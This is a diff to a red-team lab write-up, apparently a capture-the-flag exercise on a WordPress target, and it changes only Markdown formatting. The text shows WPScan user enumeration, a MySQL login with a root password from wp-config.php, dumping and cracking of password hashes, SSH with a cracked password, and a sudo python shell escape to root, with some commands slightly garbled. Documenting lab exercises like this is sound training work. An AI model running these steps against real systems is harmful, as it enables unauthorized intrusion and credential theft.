@@ -40,8 +40,8 @@ The following vulnerabilities were identified on each target:
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
 - Target 1
   - `flag1{b9bbcb33e11b80be759c4e844862482d}`
-    - **Exploit Used**
-      - Used WPScan to enumerate users on the target machine 
+   - **Exploit Used**
+    - Used WPScan to enumerate users on the target machine 
 
 ![image](Screenshots/WPScan.JPG)
    
@@ -59,7 +59,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 ![image](Screenshots/Flag1.JPG)
     
   - `flag2 {fc3fd58dcdad9ab23faca6e9a36e581c}`
-    - **Exploit Used**
+   - **Exploit Used**
     - Same as flag1. A flag2.txt file was found by snooping around in Micheal's account folders
     - Commands used:
      - cd ..
@@ -71,7 +71,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
  
   - flag3 {afc01ab56b50591e7dccf93122770cd2} 
   - flag4 {715dea6c055b9fe3337544932f2941ce}
-    - **Exploit Used** 
+   - **Exploit Used** 
     - Used credentials from wp-config.php file for MYSQL database, I logged into MYSQL. Flags 3 and 4 were found in the wp_posts tabel in the MYAQL wordpress database   
  
  ![image](Screenshots/Flag3and4.JPG)
@@ -86,10 +86,10 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
 - Commands used:
     - mysql -u root -p (password: R@v3nSecurity from the wp-config.php file on michael's account)
-    - show databases;`
-    - use wordpress;` 
-    - show tables;`
-    - select * from wp_users;`
+    - show databases;
+    - use wordpress; 
+    - show tables;
+    - select * from wp_users;
 ![MySQL Hashes](Screenshots/MYSQLPasswordHashes.JPG)
 
  - After dumping the password hashes into a wp_hashes.txt file onto the Kali machine, I used John the Ripper to crack steven's password
@@ -101,12 +101,12 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
  ![Steven's Priviledges](Screenshots/StevenPriviledges.png)
  
             - Commands: 
-                - `ssh steven@192.168.1.110`
-                - `pw:pink84`
-                - `sudo -l`
-                - `sudo python -c 'import os; os.system("bin/bash/")
-                - `cd /root`
-                - `ls`
-                - `cat flag4.txt`
+                - ssh steven@192.168.1.110
+                - pw:pink84
+                - sudo -l
+                - sudo python -c 'import os; os.system("bin/bash/")
+                - cd /root
+                - ls
+                - cat flag4.txt
                 
 ![Falg 4](Screenshots/flag4.png)
